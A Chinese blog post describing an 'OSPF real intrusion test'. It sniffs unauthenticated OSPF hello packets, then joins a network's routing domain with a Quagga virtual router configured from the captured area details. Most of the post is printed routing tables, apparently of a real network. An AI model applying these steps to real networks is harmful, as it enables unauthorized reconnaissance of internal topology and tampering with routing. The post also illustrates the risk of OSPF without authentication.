---
title:  OSPF 真实入侵测试
date: 2016/7/05 08:36:46 
description: OSPF 真实入侵测试
categories: 技术
tags: [ospf,network]
---

### 1. 准备工作
####  抓包探测
- 使用Wireshark抓取到未链路验证的OSPF或者OSPFv3的hello数据包。

####  VirtualBox  

一台VirtualBox虚拟机需要接入到拓扑，虚拟机系统为CentOS6，有三块网卡，

- eth0为用于桥接到主机网卡，该网卡为抓取到OSPF或者OSPFv3的hello数据包的网卡
- eth1为host-only模式，用于本地宿主机通过xshell登录。

####   逻辑拓扑

逻辑拓扑如下图所示，其实PC代表宿主机，Vigilante代表在宿主机中的虚拟机，虚拟机网卡eth0桥接到宿主机网卡。虚拟机系统为CentOS6，以安装配置好quagga。

使用Wireshark抓包，抓到未加链路认证的ospf hello数据包

<center> ![1-1](http://qingdao.icean.cc:11234/Imgbed/OSPF_真实入侵测试/1-1.jpg)</center><center style="color:purple">**图1-1 逻辑拓扑**</center>

----------

### 2. 入侵流程
####  quagga服务器启动 

启动quagga相关的服务，zebra为模拟路由器的基本服务，ospfd为OSPF所需要的服务，偶是ospf6d为OSPFv3所需要的服务

```shell
service zebra start
service ospfd start
service ospf6d start
```

####  配置OSPF 

输入路由配置模式

```markdown
vtysh
hostname# configure terminal
hostname(config)# router ospf
```

配置路由id，应该选择一些比较冷僻的路由ID，避免和整个网络中其他OSPF路由ID重复，这里为2.2.2.178

```markdown
hostname(config-router)# router-id 2.2.2.178
```

其中不用配置eth0的IP地址，因为eth0的地址已经DHCP获得了，添加在OSPF中的网络，其中网络地址根据获取的IP计算，area号根据之前抓取的hello包所得。

```markdown
hostname(config-router)# network  10.30.7.0/21 area 4
hostname(config-router)# do write
```

查看邻居关系，若结果有邻居关系且为full，说明建立了邻居关系，如果关系为init，需要多等待一会。

```markdown
Vigilante# show ip ospf  neighbor  
 Neighbor ID Pri State           Dead Time Address         Interface            RXmtL RqstL DBsmL
2.2.2.9          1 Full/DR           36.907s 30.30.30.254    eth2:30.30.30.1          0     0     0
```

当邻居关系为Full的时候，可以查看路由表了

```css
Vigilante# sh ipv6  route  
Codes: K - kernel route, C - connected, S - static, R - RIPng, O - OSPFv3,
       I - ISIS, B - BGP, * - FIB route.

C>* ::1/128 is directly connected, lo
C>* 2001:cc0:2020:4008::/64 is directly connected, eth0
C * fe80::/64 is directly connected, eth1
C>* fe80::/64 is directly connected, eth0
C>* fec0::/64 is directly connected, eth1
Vigilante# sh ip route  
Codes: K - kernel route, C - connected, S - static, R - RIP, O - OSPF,
       I - ISIS, B - BGP, > - selected route, * - FIB route

O   0.0.0.0/0 [110/1] via 10.211.7.254, eth0, 00:00:14
K>* 0.0.0.0/0 via 10.211.7.254, eth0
O>* 10.1.1.0/30 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 10.3.3.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.4.1.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.0/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.4/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.8/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.12/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.16/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.20/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.24/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.28/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.32/30 [110/11] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.36/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.40/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.44/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.48/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.72/29 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.80/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.84/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.88/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.92/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.96/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.128/29 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.136/29 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.152/29 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.168/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.176/29 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.184/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.188/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.200/30 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 10.10.10.208/28 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.10.10.240/28 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 10.200.0.0/16 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 10.201.0.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 10.201.128.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 10.202.0.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.202.32.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.202.64.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.202.128.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.202.160.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.203.0.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.203.128.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.203.160.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.204.0.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 10.205.0.0/21 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 10.210.0.0/16 [110/13] via 10.211.7.254, eth0, 00:00:15
O   10.211.0.0/21 [110/10] is directly connected, eth0, 00:00:51
C>* 10.211.0.0/21 is directly connected, eth0
O>* 10.211.8.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.211.16.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.211.24.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 10.211.40.0/21 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 10.211.48.0/21 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 121.195.186.0/28 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 121.195.186.32/27 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 121.195.186.64/26 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 121.195.186.128/25 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 124.16.64.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.65.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.66.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.67.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.68.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.70.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.72.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.73.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.74.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 124.16.75.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 124.16.75.11/32 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 124.16.98.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.99.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.100.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.102.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.104.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.106.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.108.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.112.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.116.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 124.16.120.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
C>* 127.0.0.0/8 is directly connected, lo
K>* 169.254.0.0/16 is directly connected, eth1
O>* 172.16.4.0/22 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.8.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.9.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.10.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.11.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.13.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.14.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.32.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.33.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.35.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.16.40.0/22 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 172.31.216.0/23 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.10.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.11.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.12.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.13.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.14.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.15.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.16.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.17.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.18.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.19.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.20.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.21.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.22.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.23.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.24.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.25.0/24 [110/11] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.26.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.27.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.28.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.29.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.32.0/24 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.33.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.34.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.35.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.38.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.50.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.63.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.12/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.16/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.20/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.24/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.28/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.63.32/29 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.64.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.64.0/28 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.65.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 192.168.67.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.68.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.69.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.70.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.72.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.73.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.74.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.75.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
C>* 192.168.86.0/24 is directly connected, eth1
O>* 192.168.94.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.96.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.126.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.127.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.128.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.200.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.201.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.202.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.203.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.204.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.249.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.250.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.252.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.252.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.252.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.252.12/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.252.16/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.253.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.253.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 192.168.253.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.192.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.196.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.196.0/25 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.76.196.128/25 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.76.197.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.198.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.200.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.202.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.203.0/25 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.76.203.128/26 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.76.204.0/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.204.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.205.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.206.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.208.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.210.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.211.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.76.212.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.76.216.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.0.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.77.0.0/27 [110/1] via 10.211.7.254, eth0, 00:00:14
O>* 210.77.0.32/27 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.0.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.1.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.2.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.4.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.8.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.12.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.14.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.15.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.16.0/25 [110/12] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.16.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.17.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.18.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.19.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.20.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.21.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.77.22.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.24.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.26.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.28.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.29.0/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.29.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.30.0/26 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.30.64/26 [110/20] via 10.211.7.254, eth0, 00:00:14
O>* 210.77.30.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15
O>* 210.77.31.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14
```

####   配置OSPFv3

输入路由配置模式

```markdown
vtysh
hostname# configure terminal
hostname(config)# router ospf6
```

配置路由id，应该选择一些比较冷僻的路由ID，避免和整个网络中其他OSPF路由ID重复，这里为2.2.2.179

```markdown
hostname(config-router)# router-id 2.2.2.179
```

添加在OSPFv3中的网络，area必须为x.x.x.x这种格式，否则会报错。area信息获取同样从抓取的hello包中获知。

```markdown
hostname(config-router)# interface eth0 area 0.0.0.4
hostname(config-router)# do write
```

查看邻居关系，若结果有邻居关系且为full，说明建立了邻居关系

```markdown
Vigilante# show ipv6  ospf6  neighbor  
Neighbor ID     Pri    DeadTime  State/IfState         Duration I/F[State]
2.2.2.26              1    00:00:37   Full/DR              00:09:23 eth2[DROther]
```

邻居关系为Full时候，则可以查看路由表了

```css
Vigilante# sh ipv6  route
Codes: K - kernel route, C - connected, S - static, R - RIPng, O - OSPFv3,
       I - ISIS, B - BGP, * - FIB route.

O>* ::/0 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
C>* ::1/128 is directly connected, lo
O>* 2001:cc0:2020:1::/64 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1003::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1004::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1006::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1007::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1008::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1032::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1033::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1034::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:1035::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2000::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2011::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2012::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2013::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2014::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2015::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2016::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2017::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2018::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2020::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2021::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2022::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:2030::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:3001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:3002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:3003::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4004::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4006::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4007::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O   2001:cc0:2020:4008::/64 [110/1] is directly connected, eth0, 00:01:13
C>* 2001:cc0:2020:4008::/64 is directly connected, eth0
O>* 2001:cc0:2020:4009::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4012::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4013::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4014::/64 [110/1] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:1::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:2::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:3::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:4::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:5::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:6::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:7::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:8::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:9::/80 [110/2] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:10::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:11::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:12::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:13::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:14::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:15::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:16::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:17::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:20::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:21::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:22::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:23::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:24::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:25::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:26::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:27::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4015:28::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4016::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4017::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4018::/64 [110/2] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4020::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4021::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4022::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4023::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4024::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4025::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4026::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4027::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4028::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4029::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4030::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4031::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4032::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4033::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4035::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4036::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4039::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
